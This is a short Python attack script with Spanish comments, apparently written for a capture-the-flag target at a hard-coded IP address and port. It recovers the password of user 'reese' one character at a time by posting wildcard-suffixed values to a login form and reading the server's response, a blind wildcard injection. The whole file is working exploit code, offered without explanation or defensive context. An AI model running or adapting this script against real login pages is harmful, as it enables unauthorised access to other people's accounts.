#!/usr/bin/python

import requests,sys,signal,string
from pwn import *

#Ctrl+c
def def_handler(sig, frame):
    print("\n [!] Saliendo...")
    sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


#Variables globales
url = 'http://138.68.188.223:30068/login' 
proxy = {'http': 'http://127.0.0.1:8080'}
characters=string.printable

password=""

def makeRequest(pwd):
        
    data={"username":"reese","password":f"{pwd}*"}
    response = requests.post(url,data=data)
    if "No search results." in response.text:
        return True

    return False

if __name__ == '__main__':
    
    p1 = log.progress("Login Brute Forcer Attack")
    p2 = log.progress("Password: ")
    p1.status("Explotando contrase√±a por fuerza bruta")
    
    sleep(2)
    completed_pw= False
    
    while completed_pw == False:    
        char_counter=0
        for c in characters:
            if c != '*':
                p1.status(f"Probando con la letra {c}")
                if makeRequest(f"{password}{c}"):
                    password+=c
                    p2.status(password)
                    break;
            char_counter+=1

        if char_counter == len(characters):
            completed_pw = True

    sys.exit(0)


